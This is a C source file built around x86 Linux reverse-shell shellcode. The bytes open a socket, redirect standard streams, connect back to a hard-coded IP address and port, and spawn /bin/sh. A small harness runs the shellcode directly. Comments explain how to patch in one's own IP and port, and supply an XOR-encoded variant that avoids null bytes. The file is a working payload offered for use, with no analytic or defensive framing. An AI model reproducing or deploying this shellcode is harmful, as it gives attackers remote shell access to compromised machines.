#include<stdio.h>
#include<string.h>
unsigned char shellcode[] = 
"\x31\xdb\x53\x43\x53\x6a\x02\x6a\x66\x58\x89\xe1\xcd\x80\x93"
"\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x5b\x5a\x68\xc0\xa8\x01\x64"
"\x66\x68\x08\xae\x43\x66\x53\x89\xe1\xb0\x66\x50\x51\x53\x89"
"\xe1\x43\xcd\x80\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e"
"\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80";

/*

Enter your IP in the last 4 bytes  on line 2, and your port on the 3rd and 
4th byte on line 3.

If your IP contains a 0 in one of the octets you can alternatively use the
below shellcode and xor your port with 0x2122, and enter that in line 4 for bytes 4 
and 5, and xor each octet of your IP with \x13,\x14,\x15,\x16 respectively, which 
goes on the last 3 bytes on line 3 and first by on line 4.

"\x6a\x45\x59\xe8\xff\xff\xff\xff\xc1\x5e\x30\x4c\x0e\x07\xe2"
"\xfa\x30\xd9\x50\x47\x56\x6c\x05\x62\x6f\x52\x82\xed\xc0\x8e"
"\x9c\x49\xa1\x2d\xde\x94\x5c\x6f\xee\x43\x43\x72\xdb\xb4\x1c"
"\x7a\x79\x48\x29\x8c\x60\x42\x76\xaf\xc6\x98\x4f\x7a\x7a\x7f"
"\xa4\xcf\x6c\xfd\xb1\x60\x5b\x1b\x1a\x45\x5f\x50\x16\x58\x52"
"\x52\xb4\xdd\x6d\x13\xc8\xa3\xf3\x4f\x88\xc6";

*/

main()
{
printf("Shellcode Length    :  %d\n", strlen(shellcode));
  int (*ret)() = (int(*)())shellcode;
  ret();
}

